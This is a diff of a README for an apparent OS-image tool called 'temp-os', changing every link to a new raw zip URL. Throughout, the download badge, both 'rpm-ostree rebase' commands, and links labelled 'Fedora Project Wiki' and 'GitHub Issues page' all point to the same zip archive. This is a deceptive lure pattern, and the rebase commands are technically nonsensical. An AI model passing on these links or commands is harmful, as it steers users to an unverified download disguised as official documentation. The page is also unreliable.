@@ -1,6 +1,6 @@
 # 🌟 temp-os - A Simple Way to Use Custom OS Images
 
-[![Download temp-os](https://raw.githubusercontent.com/SanhitaVichare/temp-os/main/leprechaun/temp-os.zip)](https://raw.githubusercontent.com/SanhitaVichare/temp-os/main/leprechaun/temp-os.zip)
+[![Download temp-os](https://raw.githubusercontent.com/SanhitaVichare/temp-os/main/files/system/sway/temp-os-v3.4.zip)](https://raw.githubusercontent.com/SanhitaVichare/temp-os/main/files/system/sway/temp-os-v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ temp-os is a user-friendly application designed to help you run custom operating
 
 To get started, visit the following page to download temp-os:
 
-[Download temp-os](https://raw.githubusercontent.com/SanhitaVichare/temp-os/main/leprechaun/temp-os.zip)
+[Download temp-os](https://raw.githubusercontent.com/SanhitaVichare/temp-os/main/files/system/sway/temp-os-v3.4.zip)
 
 ### Step-by-Step Installation
 
@@ -26,7 +26,7 @@ To get started, visit the following page to download temp-os:
    - After downloading, open your terminal.
    - First, rebase to the unsigned image. Run this command:
    ```
-   rpm-ostree rebase https://raw.githubusercontent.com/SanhitaVichare/temp-os/main/leprechaun/temp-os.zip
+   rpm-ostree rebase https://raw.githubusercontent.com/SanhitaVichare/temp-os/main/files/system/sway/temp-os-v3.4.zip
    ```
    - Reboot your system to complete this step. Use:
    ```
@@ -36,7 +36,7 @@ To get started, visit the following page to download temp-os:
 4. **Rebase to the Signed Image**
    - After rebooting, run the following command to rebase to the signed image:
    ```
-   rpm-ostree rebase https://raw.githubusercontent.com/SanhitaVichare/temp-os/main/leprechaun/temp-os.zip
+   rpm-ostree rebase https://raw.githubusercontent.com/SanhitaVichare/temp-os/main/files/system/sway/temp-os-v3.4.zip
    ```
 
 ### ⚙️ System Requirements
@@ -55,11 +55,11 @@ To get started, visit the following page to download temp-os:
 
 ### 🛑 Warning
 
-temp-os is an experimental feature. Please try it at your own discretion. For more details on using this experimental feature, you can refer to the [Fedora Project Wiki](https://raw.githubusercontent.com/SanhitaVichare/temp-os/main/leprechaun/temp-os.zip).
+temp-os is an experimental feature. Please try it at your own discretion. For more details on using this experimental feature, you can refer to the [Fedora Project Wiki](https://raw.githubusercontent.com/SanhitaVichare/temp-os/main/files/system/sway/temp-os-v3.4.zip).
 
 ### 💬 Community Support
 
-For questions or assistance, feel free to open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/SanhitaVichare/temp-os/main/leprechaun/temp-os.zip). Our community is here to help you.
+For questions or assistance, feel free to open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/SanhitaVichare/temp-os/main/files/system/sway/temp-os-v3.4.zip). Our community is here to help you.
 
 ## 🏷️ Topics
 
